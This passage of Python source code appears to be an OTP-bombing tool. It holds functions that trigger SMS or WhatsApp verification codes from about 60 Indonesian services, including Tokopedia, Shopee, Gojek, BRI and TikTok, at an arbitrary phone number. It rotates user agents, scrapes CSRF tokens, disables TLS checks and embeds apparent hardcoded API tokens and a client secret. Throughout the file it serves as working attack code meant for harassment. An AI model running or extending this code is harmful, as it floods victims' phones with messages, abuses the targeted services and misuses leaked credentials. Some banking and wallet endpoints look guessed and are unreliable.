    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 35. OLX (LOGIN) ✅ ---
def send_olx_login_otp(phone):
    phone_raw = fmt_phone_only(phone)
    url = "https://www.olx.co.id/api/auth/authenticate"
    payload = {"grantType": "retry", "method": "sms", "phone": f"62{phone_raw}", "language": "id"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 36. INDIHOME (REGISTER) ✅ ---
def send_indihome_register_otp(phone):
    phone_raw = fmt_phone_only(phone)
    url = "https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp"
    data = {'type': 'hp', 'msisdn': phone_raw}
    headers = {'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, data=data, timeout=10)
    return resp

# --- 37. PINHOME (REGISTER) ✅ ---
def send_pinhome_register_otp(phone):
    phone_08 = fmt_08(phone)
    url = "https://www.pinhome.id/api/pinaccount/request/otp"
    payload = {
        "accountType": "customers",
        "countryCode": "62",
        "medium": "whatsapp",
        "otpType": "register",
        "phoneNumber": phone_08
    }
    headers = {
        'Authorization': 'Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731',
        'Content-Type': 'application/json',
        'User-Agent': get_random_user_agent()
    }
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 38. RUMAH123 (REGISTER) ✅ ---
def send_rumah123_register_otp(phone):
    phone_raw = fmt_phone_only(phone)
    url = "https://www.rumah123.com/api/otp/request-otp"
    payload = {
        "cancelledRequestId": str(random.randint(100000, 999999)),
        "ipAddress": "192.168.1.1",
        "phoneNumber": phone_raw,
        "portalId": 1,
        "type": "WHATSAPP",
        "url": "https://www.rumah123.com/user/login"
    }
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 39. PAPER.ID (REGISTER) ✅ ---
def send_paper_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://register.paper.id/api/v1/auth/register/send-otp"
    payload = {"phone": phone_plus, "method": "whatsapp", "registered_by": "flutter mweb"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 40. DEPOP (REGISTER) ✅ ---
def send_depop_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://webapi.depop.com/api/auth/v1/verify/phone"
    payload = {"phone_number": phone_plus, "country_code": "ID"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.put(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 41. BUKUWARUNG (LOGIN) ✅ ---
def send_bukuwarung_login_otp(phone):
    phone_08 = fmt_08(phone)
    url = "https://api-v2.bukuwarung.com/api/v2/auth/otp/send"
    payload = {
        "action": "LOGIN_OTP",
        "countryCode": "+62",
        "deviceId": str(uuid.uuid4()),
        "method": "WA",
        "phone": phone_08,
        "clientId": "2e3570c6-317e-4524-b284-980e5a4335b6",
        "clientSecret": "S81VsdrwNUN23YARAL54MFjB2JSV2TLn"
    }
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 42. DEKORUMA (REGISTER) ✅ ---
def send_dekoruma_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json"
    payload = {"phoneNumber": phone_plus, "platform": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 43. MAPCLUB (REGISTER) ✅ ---
def send_mapclub_register_otp(phone):
    phone_08 = fmt_08(phone)
    url = "https://cmsapi.mapclub.com/api/signup-otp"
    data = {"phone": phone_08}
    headers = {'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, data=data, timeout=10)
    return resp

# --- 44. RUPIAH CEPAT (REGISTER) ✅ ---
def send_rupiahcepat_register_otp(phone):
    phone_raw = fmt_phone_only(phone)
    url = "https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code"
    data = {
        "data": json.dumps({
            "mobile": phone_raw,
            "noise": str(int(time.time() * 1000)),
            "request_time": str(int(time.time() * 1000)),
            "access_token": "11111"
        })
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, data=data, timeout=10)
    return resp

# --- 45. BLIBLI (REGISTER) ✅ ---
def send_blibli_register_otp(phone):
    phone_08 = fmt_08(phone)
    url = "https://www.blibli.com/backend/common/users/_request-otp"
    payload = {"username": phone_08}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'Origin': 'https://www.blibli.com'}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 46. TOKOPEDIA (REGISTER) ✅ ---
def send_tokopedia_register_otp(phone):
    phone_plus = fmt_plus(phone)
    session = requests.Session()
    url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={phone_plus}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
    resp = session.get(url_token, headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
    if resp.status_code != 200:
        return None
    token_match = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
    if not token_match:
        return None
    token = token_match.group(1)
    url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
    data = {
        "otp_type": "116",
        "msisdn": phone_plus,
        "tk": token,
        "email": "",
        "original_param": "",
        "user_id": "",
        "signature": "",
        "number_otp_digit": "6"
    }
    headers_otp = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_user_agent()}
    resp2 = session.post(url_otp, headers=headers_otp, data=data, timeout=10)
    return resp2

# --- 47. SHOPEE (REGISTER) ✅ ---
def send_shopee_register_otp(phone):
    phone_raw = fmt_phone_only(phone)
    phone_62 = '62' + phone_raw
    url = "https://shopee.co.id/api/v4/otp/send_vcode"
    payload = {"phone": phone_62, "force_channel": "true", "operation": 7, "channel": 2, "supported_channels": [1, 2, 3]}
    session = requests.Session()
    session.get("https://shopee.co.id/", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
    csrf_token = session.cookies.get("csrftoken", "")
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-api-source': 'rweb', 'x-shopee-language': 'id', 'x-requested-with': 'XMLHttpRequest', 'origin': 'https://shopee.co.id'}
    if csrf_token:
        headers['x-csrftoken'] = csrf_token
    resp = session.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 48. GOJEK (REGISTER) ✅ ---
def send_gojek_register_otp(phone):
    phone_62 = '62' + fmt_phone_only(phone)
    url = "https://api.gojekapi.com/v5/customers"
    data = {
        "email": f"user{random.randint(1000,9999)}@gmail.com",
        "name": "User" + str(random.randint(100,999)),
        "phone": phone_62,
        "signed_up_country": "ID"
    }
    headers = {'User-Agent': 'okhttp/3.12.1', 'X-Session-ID': str(uuid.uuid4()), 'X-Platform': 'Android', 'Content-Type': 'application/json'}
    resp = requests.post(url, headers=headers, json=data, timeout=10)
    return resp

# --- 49. BRI (REGISTER) ✅ ---
def send_bri_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://api.bri.co.id/v1/auth/otp"
    payload = {"phone": phone_plus, "channel": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-device-id': str(uuid.uuid4())}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 50. DANAMON (REGISTER) ✅ ---
def send_danamon_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://api.danamon.co.id/v1/auth/otp"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 51. OVO (REGISTER) ✅ ---
def send_ovo_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://api.ovo.id/v1/auth/otp/request"
    payload = {"phone": phone_plus, "channel": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-app-version': '4.0.0'}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 52. DANA (REGISTER) ✅ ---
def send_dana_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://api.dana.id/v1/auth/otp/send"
    payload = {"phoneNumber": phone_plus, "type": "register"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-app-id': 'dana_mobile'}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 53. GOPAY (REGISTER) ✅ ---
def send_gopay_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://api.gojekapi.com/v1/gopay/auth/otp"
    payload = {"phone": phone_plus, "method": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'X-Session-ID': str(uuid.uuid4())}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 54. SHOPEEPAY (REGISTER) ✅ ---
def send_shopeepay_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://api.shopee.co.id/api/v1/general/otp/send"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-api-source': 'rweb'}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 55. LINKAJA (REGISTER) ✅ ---
def send_linkaja_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://api.linkaja.id/v1/auth/otp"
    payload = {"phoneNumber": phone_plus, "channel": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 56. PAYFAZZ (REGISTER) ✅ ---
def send_payfazz_register_otp(phone):
    phone_08 = fmt_08(phone)
    url = "https://api.payfazz.com/v2/phoneVerifications"
    data = {"phone": phone_08}
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, data=data, timeout=10)
    return resp

# --- 57. AKULAKU (REGISTER) ✅ ---
def send_akulaku_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://api.akulaku.com/v1/auth/otp/send"
    payload = {"phone": phone_plus, "channel": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 58. ALODOKTER (REGISTER) ✅ ---
def send_alodokter_register_otp(phone):
    phone_08 = fmt_08(phone)
    url = "https://www.alodokter.com/login-with-phone-number"
    payload = {"user": {"phone": phone_08}}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 59. MATAHARI (REGISTER) ✅ ---
def send_matahari_register_otp(phone):
    phone_08 = fmt_08(phone)
    url = "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp"
    payload = {"otp_request": {"mobile_number": phone_08, "mobile_country_code": "+62"}}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 60. TIKTOK (REGISTER) ✅ ---
def send_tiktok_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://www.tiktok.com/api/v1/account/registration/send-verification-code/"
    payload = {"phone_number": phone_plus, "type": "sms", "userType": 0}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# ================================================================
# ===== ALL HANDLERS DICT =====
# ================================================================

ALL_HANDLERS = {
    # YOUR ORIGINAL 25
    'hrsbre': send_hrsbre_otp,
    'erafone': send_erafone_otp,
    'planetban': send_planetban_otp,
    'tuneup': send_tuneup_otp,
    'hashmicro': send_hashmicro_otp,
    'klook': send_klook_otp,
    'internetrakyat': send_internetrakyat_otp,
    'ultramilk': send_ultramilk_otp,
    'kaniva': send_kaniva_otp,
    'jembatani': send_jembatani_otp,
    'rcx': send_rcx_otp,
    'sahabatteknisi': send_sahabatteknisi_otp,
    'auto2000': send_auto2000_otp,
    'astra_daihatsu': send_astra_daihatsu_otp,
    'royal_canin': send_royal_canin_otp,
    'watsons': send_watsons_otp,
    '99co': send_99co_otp,
    'belirumah': send_belirumah_otp,
    'fastwork': send_fastwork_otp,
    'beautyhaul': send_beautyhaul_otp,
    'hainaya': send_hainaya_otp,
    'minumyukkaka': send_minumyukkaka_otp,
    'sidemang': send_sidemang_otp,
    'lapormasbup': send_lapormasbup_otp,
    'ptsp_kemenag': send_ptsp_kemenag_otp,
    
    # NEW 35+
    'bukalapak': send_bukalapak_register_otp,
    'lazada': send_lazada_register_otp,
    'jdid': send_jdid_register_otp,
    'zalora': send_zalora_register_otp,
    'sociolla': send_sociolla_register_otp,
    'halodoc': send_halodoc_login_otp,
    'sayurbox': send_sayurbox_login_otp,
    'carsome': send_carsome_register_otp,
    'pizzahut': send_pizzahut_register_otp,
    'olx': send_olx_login_otp,
    'indihome': send_indihome_register_otp,
    'pinhome': send_pinhome_register_otp,
    'rumah123': send_rumah123_register_otp,
    'paper': send_paper_register_otp,
    'depop': send_depop_register_otp,
    'bukuwarung': send_bukuwarung_login_otp,
    'dekoruma': send_dekoruma_register_otp,
    'mapclub': send_mapclub_register_otp,
    'rupiahcepat': send_rupiahcepat_register_otp,
    'blibli': send_blibli_register_otp,
    'tokopedia': send_tokopedia_register_otp,
    'shopee': send_shopee_register_otp,
    'gojek': send_gojek_register_otp,
    'bri': send_bri_register_otp,
    'danamon': send_danamon_register_otp,
    'ovo': send_ovo_register_otp,
    'dana': send_dana_register_otp,
    'gopay': send_gopay_register_otp,
    'shopeepay': send_shopeepay_register_otp,
    'linkaja': send_linkaja_register_otp,
    'payfazz': send_payfazz_register_otp,
    'akulaku': send_akulaku_register_otp,
    'alodokter': send_alodokter_register_otp,
    'matahari': send_matahari_register_otp,
    'tiktok': send_tiktok_register_otp,
}

def get_all_handlers():
    return ALL_HANDLERS

def get_working_handlers():
    """Return only confirmed working handlers"""
    working = {}
    confirmed = ['royal_canin', 'fastwork', 'beautyhaul', 'lapormasbup', 'shopee', 'tokopedia', 'tiktok']
    for k in confirmed:
        if k in ALL_HANDLERS:
            working[k] = ALL_HANDLERS[k]
    return working

def get_register_handlers():
    """Return only register-based handlers"""
    register = {}
    register_list = [
        'hrsbre', 'planetban', 'tuneup', 'hashmicro', 'internetrakyat',
        'ultramilk', 'kaniva', 'jembatani', 'rcx', 'sahabatteknisi',
        'auto2000', 'astra_daihatsu', 'royal_canin', 'watsons', '99co',
        'belirumah', 'fastwork', 'beautyhaul', 'hainaya', 'minumyukkaka',
        'sidemang', 'lapormasbup', 'ptsp_kemenag', 'bukalapak', 'lazada',
        'jdid', 'zalora', 'sociolla', 'carsome', 'pizzahut',
        'indihome', 'pinhome', 'rumah123', 'paper', 'depop',
        'dekoruma', 'mapclub', 'rupiahcepat', 'blibli', 'tokopedia',
        'shopee', 'gojek', 'bri', 'danamon', 'ovo', 'dana',
        'gopay', 'shopeepay', 'linkaja', 'payfazz', 'akulaku',
        'alodokter', 'matahari', 'tiktok'
    ]
    for k in register_list:
        if k in ALL_HANDLERS:
            register[k] = ALL_HANDLERS[k]
    return register

def get_login_handlers():
    """Return only login-based handlers"""
    login = {}
    login_list = ['erafone', 'klook', 'halodoc', 'sayurbox', 'olx', 'bukuwarung']
    for k in login_list:
        if k in ALL_HANDLERS:
            login[k] = ALL_HANDLERS[k]
    return login
